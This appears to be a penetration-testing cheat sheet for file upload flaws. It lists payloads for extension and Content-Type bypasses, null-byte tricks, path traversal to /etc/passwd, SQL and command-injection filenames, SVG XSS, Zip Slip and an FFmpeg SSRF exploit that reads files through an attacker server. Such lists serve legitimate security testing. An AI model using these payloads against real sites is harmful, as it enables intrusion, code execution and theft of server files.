***

**Upload Function**
- ImageTragick
- XXE via svg file
- XXE via excel file
- Bypass extensions while uploading (.jpg to .php, php3, php4, etc)
- Content-type validation
	- Upload `file.php` and change the Content-Type `application/x-php` to `Content-Type image/png`
- Using Null-Byte: Upload img.phpD.jpg now change the value D (44) in Hex to 00
- LFI: put file name `../../etc/passwd/logo.png` to get directory traversal via upload file
- SQL: 'sleep(10).jpg'
**SSRF** (and local file disclosure) via FFmpeg HLS processing
- [hackerone_report](hackerone.com/reports/237381)
- Upload the ssrf.avi (ssrf_via_video.avi) and listen the port 1337 on your VPS if you get response then exploit it further to LFI
- Exploitation:
	- Modify the file.avi and change the path to `http://ip:8080/initialm3u?filename=/etc/passwd` run the exploit: `python3 file_reading_server.py --external-addr ip --port 8080`
- Upload file.js & file.config (web.config)
- Pixel flood attack using image
- Dos using large values like name of a image `1234567891011...99999.png`
- XSS payload in image name `payload.jpg`
- (Zip Slip) if a site accepts `.zip` file, upload .php and compress it into `.zip` and upload it. Now visit `site.com/path?page=zip://path/file.zip%23rce.php
---
**File upload and what to search**

```
ASP / ASPX / PHP5 / PHP / PHP3 : WebShell / RCE
SVG: Stored XSS / SSRF / XXE
GIF: Stroed XSS / SSRF
CSV: CSV injection
XML: XXE
AVI: LFI / SSRF
ZIP: RCE via LFI / DOS
HTML / JS :HTML injection / XSS / Open redirect
PNG / JPGE:Pixel flood attack (DoS)
PDF / PPTX: SSRF / BLIND XXE
```

**File upload chain**
```
../../../tmp/lol.png -> for path traversal
sleep(10)-- -.jpg    -> for SQL injection
<svg  onload=alert(document.domain)>.jpg/png -> for XSS
; sleep 10; for command injections
```
